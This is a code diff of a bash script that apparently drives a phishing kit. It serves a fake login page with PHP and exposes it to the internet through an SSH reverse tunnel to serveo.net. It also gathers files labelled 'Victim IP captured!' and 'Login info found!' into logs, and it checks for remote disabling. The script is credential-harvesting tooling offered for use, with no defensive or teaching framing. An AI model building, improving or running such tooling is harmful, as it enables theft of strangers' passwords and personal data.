@@ -66,7 +66,7 @@ kill_pid() {
     local process="php"
     if pidof "$process" > /dev/null; then
         killall "$process" > /dev/null 2>&1
-        success "Stopped running PHP processes."
+        echo "Stopped running PHP processes."
     else
         echo -e "No PHP processes found."
     fi
@@ -81,12 +81,12 @@ setup_site() {
     echo -e "${YELLOW}Enter Port Number to Host On:${RESET}"
     read -r PORT
     if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
-        error "Invalid port number. Please enter a number."
+        echo "Invalid port number. Please enter a number."
         return
     fi
     echo -e "Starting PHP server on port $PORT..."
     php -S "$HOST":"$PORT" &>/dev/null &
-    success "Server started at http://$HOST:$PORT"
+    echo "Server started at http://$HOST:$PORT"
 }
 
 # --- MONITOR DATA ---
@@ -95,13 +95,13 @@ capture_data() {
         check_remote_control  # Ensure script isn't disabled remotely
 
         if [[ -f ".server/www/ip.txt" ]]; then
-            success "Victim IP captured!"
+            echo "Victim IP captured!"
             cat .server/www/ip.txt >> data/ip_logs.dat
             rm -f .server/www/ip.txt
         fi
 
         if [[ -f ".server/www/usernames.txt" ]]; then
-            success "Login info found!"
+            echo "Login info found!"
             cat .server/www/usernames.txt >> data/usernames.dat
             rm -f .server/www/usernames.txt
         fi
@@ -112,19 +112,19 @@ capture_data() {
 
 # --- HOST SERVER PUBLICLY ---
 host_server() {
-    ssh -R 80:localhost:$PORT nokey@localhost.run
+    ssh -R 80:localhost:$PORT serveo.net
 }
 
 # --- INSTALL REQUIRED DEPENDENCIES ---
 install_dependencies() {
-    log "Installing required packages..."
+    echo "Installing required packages..."
     apt update && apt upgrade -y
     for pkg in php openssh git curl; do
         if ! command -v "$pkg" &>/dev/null; then
-            error "$pkg not found, installing..."
+            echo "$pkg not found, installing..."
             apt install "$pkg" -y
         else
-            success "$pkg is already installed."
+            echo "$pkg is already installed."
         fi
     done
 }
@@ -163,12 +163,12 @@ main_menu() {
 
         case $choice in
             1) install_dependencies ;;
-            2) setup_site ;;
+            2) setup_site && host_server ;;
             3) capture_data ;;
             4) auto_update ;;
             5) kill_pid ;;
             6) exit 0 ;;
-            *) error "Invalid choice. Try again." ;;
+            *) echo "Invalid choice. Try again." ;;
         esac
 
         read -rp "Press Enter to continue..." _  # Wait before returning to menu
@@ -178,4 +178,5 @@ main_menu() {
 # Run the functions
 register_user
 check_access
+git pull
 main_menu
